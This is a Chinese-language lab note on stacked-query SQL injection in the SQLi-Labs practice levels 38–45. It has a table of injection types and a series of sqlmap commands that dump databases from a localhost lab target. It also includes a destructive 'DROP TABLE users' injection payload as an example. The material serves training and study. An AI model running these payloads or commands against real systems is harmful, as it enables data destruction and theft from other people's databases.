# 堆叠查询注入 (Less-38 ~ Less-45)

## 原理

堆叠查询（Stacked Queries）：用 `;` 分隔多条 SQL 语句，一次执行多个查询：

```sql
-- 正常：
SELECT * FROM users WHERE id='$id'

-- 堆叠注入：
?id=1'; DROP TABLE users; -- -

-- 后端实际执行：
SELECT * FROM users WHERE id='1'; DROP TABLE users; -- '
```

## 可用性

MySQL 中堆叠查询是否可用取决于 PHP 连接方式：

| 连接方式 | 支持堆叠 |
|---------|---------|
| `mysql_query()` | 否 |
| `mysqli_query()` | 否 |
| `mysqli_multi_query()` | 是 |
| PDO + `PDO::ATTR_EMULATE_PREPARES` | 是 |
| 命令行 `mysql` | 是 |

> PHP + MySQL 默认不支持堆叠查询，SQLi-Labs 的这些关卡实际上退化为普通注入。

## 注入类型对照

| Less | 方法 | 闭合方式 | 注入技术 |
|------|------|---------|---------|
| 38 | GET | `'id'` 单引号 | UNION |
| 39 | GET | `id` 数字型 | UNION |
| 40 | GET | `('id')` 单引号+括号 | UNION |
| 41 | GET | `id` 数字型 | UNION |
| 42 | POST | `'uname'` 单引号 | UNION |
| 43 | POST | `('uname')` 单引号+括号 | UNION |
| 44 | POST | `'uname'` 单引号 | Boolean 盲注（无回显） |
| 45 | POST | `('uname')` 单引号+括号 | Boolean 盲注（无回显） |

## 配置

```bash
TARGET="http://localhost:8080"
RESULTS_DIR="./results"
```

## 执行命令

### Less-38: GET + 单引号 + 堆叠

```bash
sqlmap -u "$TARGET/Less-38/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-38"
```

### Less-39: GET + 数字型 + 堆叠

```bash
sqlmap -u "$TARGET/Less-39/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-39"
```

### Less-40: GET + 单引号+括号 + 堆叠

```bash
sqlmap -u "$TARGET/Less-40/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-40"
```

### Less-41: GET + 数字型 + 堆叠

```bash
sqlmap -u "$TARGET/Less-41/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-41"
```

### Less-42: POST + 单引号 + 堆叠（sqlmap未复现）

```bash
sqlmap -u "$TARGET/Less-42/" \
    --data="login_user=admin&login_passwd=admin" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-42"
```

### Less-43: POST + 单引号+括号 + 堆叠（sqlmap未复现）

```bash
sqlmap -u "$TARGET/Less-43/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-43"
```

### Less-44: POST + 单引号 + 堆叠 + 盲注（sqlmap未复现）

```bash
sqlmap -u "$TARGET/Less-44/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=B --dump --output-dir="$RESULTS_DIR/Less-44"
```

### Less-45: POST + 单引号+括号 + 堆叠 + 盲注（sqlmap未复现）

```bash
sqlmap -u "$TARGET/Less-45/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=B --dump --output-dir="$RESULTS_DIR/Less-45"
```

---

> 参考：[sqlmap 完整手册](sqlmap.md) | [注入类型详解](../notes/injection-types.md) | [靶场总览](../notes/overview.md)
